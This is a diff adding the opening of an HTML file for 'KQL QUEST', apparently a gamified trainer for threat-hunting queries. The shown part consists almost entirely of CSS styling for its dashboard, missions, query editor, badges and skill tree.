@@ -1,0 +1,3151 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>KQL QUEST — Hunt. Query. Investigate. Level Up.</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#060a10; --bg2:#080e16;
+  --panel:#0d1620; --panel2:#0f1c28; --panel3:#11202f;
+  --border:#1b2c3d; --border-lit:#254257;
+  --cyan:#2be8ff; --cyan-dim:#1a8fa3;
+  --magenta:#ff3fa4; --green:#39ff88; --amber:#ffb020; --red:#ff5b5b; --purple:#b76bff;
+  --text:#dff5f7; --muted:#7d97a3; --muted2:#54707d;
+  --mono: 'JetBrains Mono', 'Fira Code', ui-monospace, monospace;
+  --disp: 'Chakra Petch', 'Rajdhani', sans-serif;
+  --body: 'Inter', system-ui, sans-serif;
+  --radius: 10px;
+}
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:var(--body);}
+body{
+  background:
+    radial-gradient(ellipse 1200px 600px at 20% -10%, rgba(43,232,255,0.08), transparent 60%),
+    radial-gradient(ellipse 1000px 500px at 100% 0%, rgba(255,63,164,0.07), transparent 60%),
+    linear-gradient(rgba(43,232,255,.05) 1px, transparent 1px) 0 0/48px 48px,
+    linear-gradient(90deg, rgba(43,232,255,.05) 1px, transparent 1px) 0 0/48px 48px,
+    var(--bg);
+  min-height:100vh;
+  position:relative;
+}
+#app{min-height:100vh;display:flex;flex-direction:column;position:relative;z-index:2;}
+::selection{background:var(--cyan);color:#001318;}
+::-webkit-scrollbar{width:10px;height:10px;}
+::-webkit-scrollbar-track{background:var(--bg2);}
+::-webkit-scrollbar-thumb{background:var(--border-lit);border-radius:6px;}
+button{font-family:inherit;cursor:pointer;}
+code, pre{font-family:var(--mono);}
+a, .link{color:var(--cyan);}
+
+/* ---------------- buttons ---------------- */
+.btn{
+  border-radius:6px;border:1px solid var(--border-lit);background:var(--panel2);color:var(--text);
+  padding:9px 16px;font-size:13px;font-weight:600;letter-spacing:0.02em;font-family:var(--disp);
+  transition:all .15s ease; text-transform:uppercase;
+}
+.btn:hover{border-color:var(--cyan);box-shadow:0 0 12px rgba(43,232,255,.25);}
+.btn-primary{background:linear-gradient(135deg,var(--cyan),#1793a8);color:#001318;border-color:var(--cyan);}
+.btn-primary:hover{box-shadow:0 0 18px rgba(43,232,255,.55);}
+.btn-secondary{background:linear-gradient(135deg,var(--green),#1a8f4c);color:#001a0d;border-color:var(--green);}
+.btn-ghost{background:transparent;}
+.btn-ghost.danger{border-color:var(--red);color:var(--red);}
+.btn.small{padding:5px 10px;font-size:11px;}
+.btn-big{width:100%;padding:14px;font-size:15px;margin-top:18px;}
+.icon-btn{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:6px 10px;font-size:15px;color:var(--text);}
+.icon-btn:hover{border-color:var(--cyan);}
+.icon-btn.danger:hover{border-color:var(--red);box-shadow:0 0 10px rgba(255,91,91,.3);}
+
+/* ---------------- HUD ---------------- */
+.hud{
+  position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:20px;
+  padding:10px 22px;background:rgba(8,14,22,0.92);backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--border);
+}
+.hud-left{cursor:pointer;display:flex;align-items:center;gap:8px;}
+.hud-insignia{width:26px;height:26px;flex-shrink:0;filter:drop-shadow(0 0 4px rgba(43,232,255,.5));}
+.hud-logo{font-family:var(--disp);font-weight:700;font-size:20px;letter-spacing:.06em;}
+.hud-logo span{color:var(--cyan);text-shadow:0 0 12px rgba(43,232,255,.6);}
+.hud-mid{flex:1;max-width:420px;}
+.hud-rank{font-family:var(--disp);font-size:11px;letter-spacing:.08em;color:var(--muted);margin-bottom:3px;}
+.xpbar{height:8px;border-radius:5px;background:var(--panel2);border:1px solid var(--border);overflow:hidden;position:relative;}
+.xpbar-fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--green));box-shadow:0 0 8px rgba(43,232,255,.6);transition:width .6s cubic-bezier(.2,.8,.3,1);position:relative;overflow:hidden;}
+.xpbar-fill::after{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);width:40%;animation:shimmer 2.2s ease-in-out infinite;}
+@keyframes shimmer{0%{transform:translateX(-120%);}100%{transform:translateX(320%);}}
+.hud-streak{font-family:var(--disp);font-weight:700;color:var(--amber);animation:flicker 2.4s ease-in-out infinite;}
+@keyframes flicker{0%,100%{opacity:1;text-shadow:0 0 6px rgba(255,176,32,.6);}50%{opacity:.75;text-shadow:0 0 12px rgba(255,176,32,.9);}}
+@media (prefers-reduced-motion: reduce){.xpbar-fill::after{display:none;}.hud-streak{animation:none;}}
+.hud-xp-label{font-size:10px;color:var(--muted2);margin-top:2px;font-family:var(--mono);}
+.hud-right{display:flex;align-items:center;gap:8px;}
+.hud-streak{font-family:var(--disp);font-weight:700;color:var(--amber);}
+.screen-body{flex:1;padding:22px;max-width:1280px;width:100%;margin:0 auto;}
+
+/* ---------------- hexagonal game-badge frames (static graphics, no motion) ---------------- */
+.hex-frame{
+  clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+  display:flex;align-items:center;justify-content:center;position:relative;z-index:0;
+}
+.hex-frame::before{
+  content:'';position:absolute;inset:2px;
+  clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+  background:radial-gradient(circle at 35% 25%, var(--panel3), var(--bg2));
+  z-index:-1;
+}
+.hex-frame > *{position:relative;z-index:1;}
+
+/* ---------------- onboarding hero emblem (static SVG, no animation) ---------------- */
+.hero-emblem{width:180px;height:180px;margin:0 auto 6px;display:block;filter:drop-shadow(0 0 26px rgba(43,232,255,.35));}
+.onboard{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
+.onboard-card{max-width:560px;background:var(--panel);border:1px solid var(--border-lit);border-radius:16px;padding:40px;box-shadow:0 0 60px rgba(43,232,255,.08);}
+.glitch-title{font-family:var(--disp);font-size:42px;font-weight:700;letter-spacing:.05em;text-align:center;}
+.glitch-title span{color:var(--cyan);text-shadow:0 0 20px rgba(43,232,255,.7);}
+.tagline{text-align:center;color:var(--magenta);font-family:var(--mono);font-size:13px;letter-spacing:.15em;margin-top:6px;text-transform:uppercase;}
+.onboard-copy{color:var(--muted);font-size:14px;line-height:1.7;margin:22px 0;}
+.onboard-label{display:block;font-family:var(--mono);font-size:11px;color:var(--cyan);letter-spacing:.1em;margin-bottom:6px;}
+.onboard-input{width:100%;padding:12px 14px;background:var(--bg2);border:1px solid var(--border-lit);border-radius:6px;color:var(--text);font-family:var(--mono);font-size:15px;}
+.onboard-input:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 10px rgba(43,232,255,.3);}
+
+/* ---------------- dashboard ---------------- */
+.dashboard-hero{
+  position:relative;height:200px;border-radius:14px;overflow:hidden;margin-bottom:18px;
+  background:linear-gradient(180deg, rgba(6,10,16,0.2) 0%, rgba(6,10,16,0.75) 65%, var(--bg) 100%), radial-gradient(ellipse at 50% 20%, rgba(43,232,255,.12), transparent 60%);
+  border:1px solid var(--border-lit);
+}
+.hero-lineup-svg{position:absolute;inset:0;width:100%;height:100%;}
+.dashboard-hero-overlay{position:absolute;top:18px;left:0;right:0;text-align:center;}
+.dashboard-hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:.25em;color:var(--cyan);opacity:.85;}
+.dashboard-hero-title{font-family:var(--disp);font-weight:700;font-size:26px;letter-spacing:.05em;margin-top:4px;text-shadow:0 0 18px rgba(43,232,255,.4);}
+.dashboard-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;}
+.dashboard-title{font-family:var(--disp);font-size:26px;font-weight:700;letter-spacing:.04em;}
+.dashboard-sub{color:var(--muted);font-size:13px;font-family:var(--mono);}
+.review-banner{background:linear-gradient(90deg,rgba(183,107,255,.15),rgba(183,107,255,.03));border:1px solid var(--purple);border-radius:8px;padding:12px 16px;margin-bottom:12px;cursor:pointer;font-size:14px;}
+.continue-bar{position:relative;overflow:hidden;display:flex;align-items:center;gap:16px;background:linear-gradient(120deg,rgba(43,232,255,.14),rgba(43,232,255,.02));border:1px solid var(--cyan);border-radius:12px;padding:16px 20px;margin-bottom:16px;cursor:pointer;}
+.continue-bar.done-bar{cursor:default;border-color:var(--green);background:linear-gradient(120deg,rgba(57,255,136,.14),rgba(57,255,136,.02));}
+.continue-glow{position:absolute;inset:0;background:radial-gradient(circle at 0% 50%, rgba(43,232,255,.35), transparent 60%);animation:sweep 3s ease-in-out infinite;pointer-events:none;}
+@keyframes sweep{0%,100%{opacity:.4;}50%{opacity:.9;}}
+.continue-info{flex:1;}
+.continue-label{font-family:var(--mono);font-size:10.5px;letter-spacing:.15em;color:var(--cyan);margin-bottom:3px;}
+.continue-title{font-family:var(--disp);font-weight:700;font-size:16px;}
+.casefile-banner{display:flex;align-items:center;gap:16px;background:linear-gradient(120deg,rgba(183,107,255,.14),rgba(183,107,255,.02));border:1px solid var(--purple);border-radius:12px;padding:14px 20px;margin-bottom:16px;cursor:pointer;}
+.casefile-banner-icon{font-size:28px;}
+.casefiles-intro{color:var(--muted);font-size:13.5px;line-height:1.6;max-width:760px;margin-bottom:18px;}
+.casefile-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px;}
+.casefile-card{background:var(--panel);border:1px solid var(--purple);border-radius:12px;padding:16px;cursor:pointer;transition:all .15s;}
+.casefile-card:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.4);}
+.casefile-card.solved{border-color:var(--green);}
+.casefile-card-top{display:flex;justify-content:space-between;font-size:13px;margin-bottom:8px;}
+.casefile-card-title{font-family:var(--disp);font-weight:700;font-size:16px;margin-bottom:6px;}
+.casefile-card-meta{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:8px;}
+.casefile-view .mission-briefing{border-color:var(--purple);}
+.case-report{margin-top:16px;background:var(--panel);border:1px solid var(--purple);border-radius:10px;padding:16px;}
+.case-report-head{font-family:var(--disp);font-weight:700;color:var(--purple);margin-bottom:12px;font-size:14px;}
+.case-q{border:1px solid var(--border);border-radius:8px;padding:10px 12px;margin-bottom:10px;background:var(--panel2);}
+.case-q.correct{border-color:var(--green);background:rgba(57,255,136,.05);}
+.case-q.wrong{border-color:var(--red);background:rgba(255,91,91,.05);}
+.case-q-label{display:block;font-family:var(--disp);font-weight:700;font-size:12.5px;letter-spacing:.05em;margin-bottom:4px;}
+.case-q-prompt{font-size:12.5px;color:var(--muted);margin-bottom:8px;}
+.case-q-input{width:100%;background:var(--bg2);border:1px solid var(--border-lit);border-radius:6px;padding:8px 10px;color:var(--text);font-family:var(--body);font-size:13px;resize:vertical;}
+.case-q-input:disabled{opacity:.65;background:var(--panel3);}
+.case-q-input:focus{outline:none;border-color:var(--cyan);}
+.case-q-hint{margin-top:6px;font-size:12px;color:var(--amber);}
+.case-q-answer{margin-top:6px;font-size:12px;color:var(--cyan);background:var(--bg2);border-radius:6px;padding:6px 8px;}
+.case-report-actions{display:flex;gap:10px;margin-top:8px;}
+.daily-card{background:var(--panel);border:1px solid var(--border-lit);border-radius:10px;padding:14px 18px;margin-bottom:20px;}
+.daily-card.done{opacity:.6;}
+.daily-head{font-family:var(--disp);font-weight:700;color:var(--amber);margin-bottom:4px;}
+.daily-body{color:var(--muted);font-size:13px;margin-bottom:8px;}
+.daily-body code{color:var(--cyan);}
+.levels{display:flex;flex-direction:column;gap:22px;}
+.level-block{border-left:3px solid var(--lvcolor,var(--cyan));padding-left:16px;}
+.level-block-head{display:flex;align-items:center;gap:10px;margin-bottom:10px;}
+.level-chip{font-family:var(--disp);font-weight:700;font-size:12px;padding:3px 9px;border-radius:4px;background:var(--lvcolor,var(--cyan));color:#00131a;}
+.level-name{font-family:var(--disp);font-size:15px;letter-spacing:.05em;color:var(--text);}
+.level-progress{margin-left:auto;font-family:var(--mono);font-size:12px;color:var(--muted);}
+.mission-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:12px;}
+.mission-card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px;cursor:pointer;transition:all .15s;position:relative;}
+.mission-card:hover{border-color:var(--cyan);transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,.35);}
+.mission-card.locked{opacity:.4;cursor:not-allowed;}
+.mission-card.done{border-color:var(--green);}
+.mission-card.next{border-color:var(--cyan);box-shadow:0 0 16px rgba(43,232,255,.25);}
+.mission-card.boss{background:linear-gradient(160deg,var(--panel),rgba(255,63,164,.08));border-color:var(--magenta);}
+.mission-card-top{display:flex;justify-content:space-between;font-size:13px;margin-bottom:8px;}
+.mission-code{font-family:var(--mono);font-size:10px;color:var(--muted2);letter-spacing:.08em;margin-bottom:2px;}
+.mission-title{font-family:var(--disp);font-weight:600;font-size:14px;margin-bottom:8px;}
+.mission-xp{font-family:var(--mono);font-size:11px;color:var(--green);}
+
+/* ---------------- campaign path (game-map style level select) ---------------- */
+.path-track{position:relative;display:flex;flex-direction:column;gap:6px;padding:10px 0;}
+.path-track::before{
+  content:'';position:absolute;left:50%;top:8px;bottom:8px;width:4px;transform:translateX(-50%);
+  background:repeating-linear-gradient(180deg,var(--lvcolor,var(--cyan)) 0 10px,transparent 10px 22px);
+  opacity:.3;border-radius:4px;
+}
+.path-node-row{display:flex;position:relative;z-index:1;padding:10px 0;}
+.path-node-row.align-left{justify-content:flex-start;padding-left:2%;}
+.path-node-row.align-right{justify-content:flex-end;padding-right:2%;}
+@media (max-width:700px){.path-node-row.align-left,.path-node-row.align-right{justify-content:center;padding:10px 0;}}
+.path-node{
+  display:flex;align-items:center;gap:14px;width:min(78%,420px);background:var(--panel);
+  border:1px solid var(--border);border-radius:14px;padding:12px 16px;cursor:pointer;transition:all .18s ease;
+}
+.path-node:hover{transform:translateY(-2px) scale(1.01);border-color:var(--lvcolor,var(--cyan));box-shadow:0 8px 24px rgba(0,0,0,.4);}
+.path-node.locked{opacity:.42;cursor:not-allowed;}
+.path-node.locked:hover{transform:none;box-shadow:none;}
+.path-node.done{border-color:var(--green);}
+.path-node.boss{border-color:var(--magenta);background:linear-gradient(135deg,var(--panel),rgba(255,63,164,.1));}
+.path-node.current{border-color:var(--lvcolor,var(--cyan));animation:nodepulse 1.8s ease-in-out infinite;}
+@keyframes nodepulse{0%,100%{box-shadow:0 0 0 0 rgba(43,232,255,.35);}50%{box-shadow:0 0 0 10px rgba(43,232,255,0);}}
+.path-node-ring{
+  flex-shrink:0;width:56px;height:56px;display:flex;align-items:center;justify-content:center;
+  border:2px solid var(--lvcolor,var(--cyan));font-size:22px;
+}
+.path-node.locked .path-node-ring{border-color:var(--border-lit);filter:grayscale(1);}
+.path-node.done .path-node-ring{border-color:var(--green);filter:drop-shadow(0 0 8px rgba(57,255,136,.5));}
+.path-node.boss .path-node-ring{border-color:var(--magenta);filter:drop-shadow(0 0 8px rgba(255,63,164,.4));}
+.path-node-body{flex:1;min-width:0;}
+.path-node-code{font-family:var(--mono);font-size:9.5px;color:var(--muted2);letter-spacing:.1em;}
+.path-node-title{font-family:var(--disp);font-weight:700;font-size:15px;margin:2px 0 5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.path-node-meta{display:flex;justify-content:space-between;font-family:var(--mono);font-size:10.5px;color:var(--muted);}
+.path-node-xp{color:var(--green);}
+
+/* ---------------- mission view ---------------- */
+.mission-view{display:grid;grid-template-columns:minmax(280px,38%) 1fr;gap:18px;align-items:start;}
+@media (max-width: 900px){.mission-view{grid-template-columns:1fr;}}
+.mission-briefing{background:var(--panel);border:1px solid var(--border-lit);border-radius:12px;padding:20px;position:sticky;top:70px;max-height:calc(100vh - 90px);overflow:auto;}
+.mission-view.boss-bg .mission-briefing{border-color:var(--magenta);box-shadow:0 0 24px rgba(255,63,164,.15);}
+.briefing-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;}
+.mission-tag{font-family:var(--mono);font-size:11px;color:var(--magenta);border:1px solid var(--magenta);padding:2px 8px;border-radius:4px;}
+.briefing-code{font-family:var(--mono);font-size:11px;color:var(--cyan);letter-spacing:.1em;margin-top:6px;}
+.briefing-title{font-family:var(--disp);font-size:22px;margin:4px 0 10px;}
+.briefing-meta{display:flex;gap:14px;align-items:center;font-size:13px;color:var(--muted);margin-bottom:14px;}
+.tag-done{color:var(--green);font-weight:700;}
+.briefing-story{font-size:13.5px;line-height:1.7;color:var(--muted);white-space:pre-line;margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.briefing-recap{font-size:13px;color:var(--muted);background:var(--panel3);border:1px dashed var(--border-lit);border-radius:8px;padding:10px 12px;margin-bottom:14px;}
+.recap-hint{display:block;margin-top:4px;color:var(--cyan);font-family:var(--mono);font-size:11px;}
+.step-tracker{display:flex;align-items:center;gap:2px;margin:10px 0 14px;flex-wrap:wrap;}
+.step-dot{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;font-weight:700;flex-shrink:0;border:2px solid var(--border-lit);color:var(--muted);}
+.step-dot.done{background:var(--green);border-color:var(--green);color:#00190d;}
+.step-dot.current{border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 10px rgba(43,232,255,.5);animation:nodepulse 1.6s ease-in-out infinite;}
+.step-dot.upcoming{opacity:.5;}
+.step-line{width:14px;height:2px;background:var(--border-lit);flex-shrink:0;}
+.briefing-objective{font-size:14px;background:var(--panel3);border:1px solid var(--border-lit);border-radius:8px;padding:10px 12px;margin-bottom:12px;}
+.think-through{font-size:12.5px;color:var(--muted);margin-bottom:14px;}
+.think-through ul{margin:6px 0 0 18px;padding:0;}
+.ds-chips{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px;}
+.ds-chip{position:relative;background:var(--panel2);border:1px solid var(--border);border-radius:5px;padding:4px 8px;font-family:var(--mono);font-size:11px;color:var(--cyan);cursor:default;}
+.ds-chip:hover .ds-cols{display:block;}
+.ds-cols{display:none;position:absolute;top:110%;left:0;background:var(--bg2);border:1px solid var(--border-lit);padding:8px;border-radius:6px;font-size:10px;color:var(--muted);width:220px;z-index:20;}
+
+.hints-panel{background:var(--panel3);border:1px solid var(--amber);border-radius:8px;padding:12px;margin-top:12px;font-size:12.5px;}
+.hints-head{font-family:var(--disp);font-weight:700;color:var(--amber);margin-bottom:8px;font-size:12px;}
+.hint-line{margin-bottom:6px;color:var(--muted);line-height:1.5;}
+.hints-actions{display:flex;gap:8px;margin-top:8px;}
+.solution-box{margin-top:10px;background:var(--bg2);border:1px solid var(--red);border-radius:6px;padding:10px;}
+.solution-box pre{white-space:pre-wrap;color:var(--green);font-size:12px;margin:6px 0 0;}
+
+.explain-panel{background:var(--panel3);border:1px solid var(--cyan-dim);border-radius:8px;padding:12px;margin-top:12px;}
+.explain-head{font-family:var(--disp);font-weight:700;color:var(--cyan);margin-bottom:8px;font-size:12px;}
+.explain-line{margin-bottom:8px;font-size:12px;}
+.explain-idx{display:inline-block;width:18px;height:18px;text-align:center;line-height:18px;background:var(--cyan);color:#001318;border-radius:50%;font-size:10px;font-weight:700;margin-right:6px;}
+.explain-line code{display:block;color:var(--cyan);margin:4px 0 3px 24px;font-size:11.5px;}
+.explain-desc{color:var(--muted);margin-left:24px;}
+.explain-note{margin-top:8px;font-size:12px;color:var(--muted);border-top:1px dashed var(--border);padding-top:8px;}
+
+/* ---------------- workbench / editor ---------------- */
+.mission-workbench{display:flex;flex-direction:column;gap:12px;}
+.editor-toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;}
+.history-select{margin-left:auto;background:var(--panel2);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px 8px;font-family:var(--mono);font-size:11px;max-width:180px;}
+.chip-row{display:flex;flex-wrap:wrap;gap:6px;}
+.chip{background:var(--panel2);border:1px solid var(--border);border-radius:5px;padding:4px 9px;font-family:var(--mono);font-size:11px;color:var(--muted);}
+.chip:hover{border-color:var(--cyan);color:var(--cyan);}
+.chip-op{color:var(--cyan-dim);}
+.chip-col{color:var(--purple);}
+
+.editor-wrap{display:flex;border:1px solid var(--border-lit);border-radius:10px;overflow:hidden;background:#050a0f;box-shadow:inset 0 0 30px rgba(0,0,0,.4);}
+.editor-gutter{width:38px;flex-shrink:0;background:#040709;color:var(--muted2);font-family:var(--mono);font-size:13px;line-height:22px;text-align:right;padding:14px 8px;user-select:none;overflow:hidden;border-right:1px solid var(--border);}
+.editor-input{
+  flex:1;margin:0;padding:14px;border:none;resize:vertical;
+  font-family:var(--mono);font-size:13px;line-height:22px;white-space:pre;word-break:break-word;
+  min-height:180px;background:transparent;color:var(--cyan);caret-color:var(--cyan);
+}
+.editor-input:focus{outline:none;}
+.editor-input::placeholder{color:var(--muted2);}
+
+/* ---------------- IntelliSense suggestion popup ---------------- */
+.suggest-box{
+  position:fixed;z-index:200;min-width:180px;max-width:280px;background:#050a0f;border:1px solid var(--cyan);
+  border-radius:8px;box-shadow:0 8px 30px rgba(0,0,0,.6),0 0 14px rgba(43,232,255,.25);overflow:hidden;
+  font-family:var(--mono);font-size:12.5px;display:none;
+}
+.suggest-item{display:flex;align-items:center;gap:8px;padding:6px 10px;cursor:pointer;color:var(--text);}
+.suggest-item.active,.suggest-item:hover{background:rgba(43,232,255,.15);}
+.suggest-type{flex-shrink:0;font-size:9px;font-weight:700;letter-spacing:.05em;padding:1px 5px;border-radius:3px;background:var(--panel2);color:var(--muted);}
+.suggest-type-op{color:var(--magenta);}
+.suggest-type-kw{color:#ff9d5c;}
+.suggest-type-fn{color:var(--cyan);}
+.suggest-type-col{color:var(--purple);}
+.suggest-type-table{color:var(--green);}
+.suggest-label{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.suggest-footer{padding:4px 10px;font-size:9.5px;color:var(--muted2);border-top:1px solid var(--border);background:var(--bg2);}
+
+.results-area{min-height:40px;}
+.feedback{border-radius:8px;padding:14px 16px;margin-bottom:12px;font-size:13.5px;}
+.feedback-head{font-family:var(--disp);font-weight:700;margin-bottom:6px;font-size:14px;}
+.feedback-body{color:var(--muted);line-height:1.6;}
+.feedback-tip{margin-top:8px;color:var(--muted2);font-size:12px;}
+.feedback.success{background:rgba(57,255,136,.08);border:1px solid var(--green);}
+.feedback.success .feedback-head{color:var(--green);}
+.float-xp{display:inline-block;margin-left:8px;color:var(--amber);font-family:var(--mono);font-size:13px;animation:floatxp .9s ease-out;}
+@keyframes floatxp{0%{transform:translateY(6px);opacity:0;}30%{opacity:1;}100%{transform:translateY(-4px);opacity:1;}}
+@media (prefers-reduced-motion: reduce){.float-xp{animation:none;}}
+.feedback.warn{background:rgba(255,176,32,.08);border:1px solid var(--amber);}
+.feedback.warn .feedback-head{color:var(--amber);}
+.feedback.fail{background:rgba(255,91,91,.08);border:1px solid var(--red);}
+.feedback.fail .feedback-head{color:var(--red);}
+.err-msg{background:#1a0a0a;border:1px solid var(--red);border-radius:6px;padding:8px 10px;color:#ff9d9d;font-size:12px;margin:8px 0;white-space:pre-wrap;}
+
+.results-table-wrap{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:10px;}
+.results-count{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:8px;}
+.results-empty{color:var(--muted);font-size:13px;padding:12px;text-align:center;}
+.table-scroll{overflow:auto;max-height:340px;}
+.results-table{border-collapse:collapse;width:100%;font-size:12px;font-family:var(--mono);}
+.results-table th{position:sticky;top:0;background:var(--panel3);color:var(--cyan);text-align:left;padding:6px 10px;border-bottom:1px solid var(--border-lit);white-space:nowrap;}
+.results-table td{padding:6px 10px;border-bottom:1px solid var(--border);color:var(--muted);white-space:nowrap;}
+.results-table tr:hover td{background:rgba(43,232,255,.05);color:var(--text);}
+
+/* ---------------- modals ---------------- */
+.modal-overlay{position:fixed;inset:0;background:rgba(3,6,10,.75);display:flex;align-items:center;justify-content:center;z-index:100;backdrop-filter:blur(3px);}
+.modal{background:var(--panel);border:2px solid var(--rc,var(--cyan));border-radius:16px;padding:32px;text-align:center;max-width:340px;box-shadow:0 0 50px var(--rc,rgba(43,232,255,.4));animation:pop .3s ease;position:relative;overflow:hidden;}
+.modal::before{
+  content:'';position:absolute;inset:-60%;background:conic-gradient(from 0deg, transparent 0 80%, var(--rc,var(--cyan)) 90%, transparent 100%);
+  animation:spin 3.5s linear infinite;opacity:.18;pointer-events:none;
+}
+@keyframes spin{to{transform:rotate(360deg);}}
+@media (prefers-reduced-motion: reduce){.modal::before{animation:none;display:none;}}
+.modal > *{position:relative;z-index:1;}
+@keyframes pop{from{transform:scale(.85);opacity:0;}to{transform:scale(1);opacity:1;}}
+.badge-modal-rarity{font-family:var(--mono);font-size:11px;letter-spacing:.15em;color:var(--rc);margin-bottom:10px;}
+.badge-modal-icon{font-size:56px;margin-bottom:10px;filter:drop-shadow(0 0 14px var(--rc));}
+.badge-modal-name{font-family:var(--disp);font-size:20px;font-weight:700;margin-bottom:6px;}
+.badge-modal-desc{color:var(--muted);font-size:13px;margin-bottom:18px;}
+.levelup-burst{font-family:var(--disp);font-size:26px;color:var(--cyan);text-shadow:0 0 20px rgba(43,232,255,.7);margin-bottom:10px;position:relative;}
+.levelup-modal{position:relative;}
+.levelup-modal::after{
+  content:'';position:absolute;top:50%;left:50%;width:40px;height:40px;margin:-20px 0 0 -20px;border-radius:50%;
+  border:2px solid var(--cyan);animation:ring 1.6s ease-out infinite;pointer-events:none;
+}
+@keyframes ring{0%{width:20px;height:20px;margin:-10px 0 0 -10px;opacity:1;}100%{width:220px;height:220px;margin:-110px 0 0 -110px;opacity:0;}}
+@media (prefers-reduced-motion: reduce){.levelup-modal::after{animation:none;display:none;}}
+.levelup-rank{font-family:var(--disp);font-size:16px;margin-bottom:18px;}
+
+/* ---------------- profile ---------------- */
+.profile-card{display:flex;align-items:center;gap:16px;margin:16px 0 20px;}
+.profile-avatar{width:64px;height:64px;border-radius:50%;background:var(--panel2);border:2px solid var(--cyan);display:flex;align-items:center;justify-content:center;font-size:30px;}
+.profile-name{font-family:var(--disp);font-size:22px;font-weight:700;}
+.profile-rank{color:var(--cyan);font-family:var(--mono);font-size:12px;}
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:24px;}
+.stat-box{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:14px;text-align:center;}
+.stat-num{font-family:var(--disp);font-size:22px;font-weight:700;color:var(--cyan);}
+.stat-label{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.05em;}
+.skill-cols{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px;}
+@media (max-width:700px){.skill-cols{grid-template-columns:1fr;}}
+.skill-col{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px;}
+.skill-col-head{font-family:var(--disp);font-weight:700;font-size:13px;margin-bottom:10px;}
+.skill-row{display:grid;grid-template-columns:110px 1fr 36px;align-items:center;gap:8px;font-size:12px;margin-bottom:8px;color:var(--muted);}
+.skill-bar{height:6px;background:var(--panel2);border-radius:4px;overflow:hidden;}
+.skill-bar-fill{height:100%;}
+.skill-bar-fill.good{background:var(--green);}
+.skill-bar-fill.bad{background:var(--red);}
+.skill-empty{color:var(--muted2);font-size:12px;}
+.activity-feed{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px;}
+.activity-row{display:grid;grid-template-columns:150px 1fr 60px;gap:8px;font-size:12px;color:var(--muted);padding:6px 0;border-bottom:1px solid var(--border);font-family:var(--mono);}
+.activity-xp{color:var(--green);text-align:right;}
+.danger-zone{margin-top:20px;background:rgba(255,91,91,.05);border:1px solid var(--red);border-radius:10px;padding:16px;}
+.danger-zone-head{font-family:var(--disp);font-weight:700;color:var(--red);font-size:13px;letter-spacing:.05em;margin-bottom:6px;}
+.danger-zone-body{color:var(--muted);font-size:12.5px;margin-bottom:10px;}
+.reset-modal-icon{font-size:44px;margin-bottom:10px;}
+.reset-modal-actions{display:flex;gap:10px;justify-content:center;margin-top:6px;}
+
+/* ---------------- badges screen ---------------- */
+.section-title{font-family:var(--disp);font-size:22px;margin:14px 0;}
+.badge-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:14px;}
+.badge-card{background:var(--panel);border:1px solid var(--rc);border-radius:10px;padding:16px;text-align:center;}
+.badge-card.locked{border-color:var(--border);opacity:.5;}
+.badge-icon{font-size:30px;margin:0 auto 8px;width:64px;height:64px;border:2px solid var(--rc);}
+.badge-name{font-family:var(--disp);font-weight:700;font-size:13px;}
+.badge-rarity{font-size:10px;color:var(--rc);text-transform:uppercase;letter-spacing:.08em;margin:4px 0;}
+.badge-desc{font-size:11px;color:var(--muted);}
+
+/* ---------------- skill tree ---------------- */
+.skilltree-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;}
+.skilltree-branch{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px;}
+.branch-title{font-family:var(--disp);font-weight:700;font-size:13px;margin-bottom:10px;color:var(--cyan);}
+.branch-nodes{display:flex;flex-direction:column;gap:6px;}
+.skill-node{display:flex;justify-content:space-between;padding:7px 10px;border-radius:6px;font-size:12px;border:1px solid var(--border);}
+.skill-node.untouched{color:var(--muted2);}
+.skill-node.weak{border-color:var(--red);color:var(--red);background:rgba(255,91,91,.06);}
